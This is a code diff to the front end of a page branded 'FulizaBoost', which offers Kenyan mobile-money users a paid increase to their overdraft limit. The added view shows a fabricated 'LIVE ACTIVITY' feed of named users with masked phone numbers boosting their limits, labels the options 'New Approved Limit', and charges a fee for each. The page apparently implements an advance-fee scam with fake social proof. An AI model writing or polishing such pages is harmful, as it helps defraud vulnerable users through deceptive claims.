@@ -261,21 +261,58 @@ function render(){
   }
 
   /* LIMITS */
-  if(step===7){
-    app.innerHTML = `
-    <div class="card">
-      <h3>Select Your Limit</h3>
-      <div class="grid">
-        ${limits.map(l=>`
-          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
-            <strong>Ksh ${l.amount}</strong>
-            <div class="fee">Fee: Ksh ${l.fee}</div>
-          </div>
-        `).join("")}
-      </div>
-      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
-    </div>`;
-  }
+ if(step===7){
+  app.innerHTML = `
+  <div style="width:90%; max-width:420px; margin:auto;">
+
+    <h1 style="text-align:center; color:#0f172a;">FulizaBoost</h1>
+    <p style="text-align:center; color:#6b7280;">
+      Instant Limit Increase • Same Day Access
+    </p>
+
+    <!-- LIVE ACTIVITY -->
+    <div style="
+      background:#f9fafb;
+      padding:15px;
+      border-radius:15px;
+      margin:15px 0;
+      font-size:14px;
+    ">
+      <b style="color:#16a34a;">LIVE ACTIVITY</b><br>
+      <span id="liveText">
+        Faith W. (0712****11) boosted to <b style="color:#16a34a;">Ksh 45,000</b> just now
+      </span>
+    </div>
+
+    <h3>Select Your New Approved Limit</h3>
+
+    <div class="grid">
+      ${limits.map(l=>`
+        <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
+          <strong style="color:#16a34a;">Ksh ${l.amount}</strong>
+          <div class="fee">FEE: KSH ${l.fee}</div>
+        </div>
+      `).join("")}
+    </div>
+
+    <button style="
+      margin-top:20px;
+      background:#15803d;
+      border-radius:20px;
+      padding:18px;
+    " onclick="openModal()">
+      ⚡ SELECT A LIMIT
+    </button>
+
+    <p style="text-align:center; margin-top:15px; color:#16a34a;">
+      💬 Need help? Chat with Support
+    </p>
+
+  </div>
+  `;
+
+  startLiveUpdates();
+ }
 }
 
 function next(){
